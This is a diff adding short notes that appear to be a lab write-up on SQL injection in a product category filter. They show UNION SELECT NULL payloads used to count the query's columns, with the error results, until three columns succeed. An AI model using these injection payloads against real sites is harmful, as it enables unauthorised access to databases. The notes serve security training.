@@ -1,0 +1,18 @@
+SQL Injection - product category filter.
+
+results from the query are returned in the application's response.
+
+You can use a UNION attack to retrieve data from other tables.
+
+First Step: Determine the number of columns that are being returned by the query.
+
+Goal: determine the number of columns returned by the query by performing
+an SQL injection UNION attack that returns an additional row containing null values.
+
+
+Process:
+SELECT ? FROM Products WHERE category = 'Gifts';
+SELECT ? FROM Products WHERE category = 'Gifts'+UNION+SELECT+NULL--'; -> Error
+SELECT ? FROM Products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL--'; -> Error
+SELECT something1, something2, something3 FROM Products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,NULL--'; -> No Error (n of columns are 3)
+
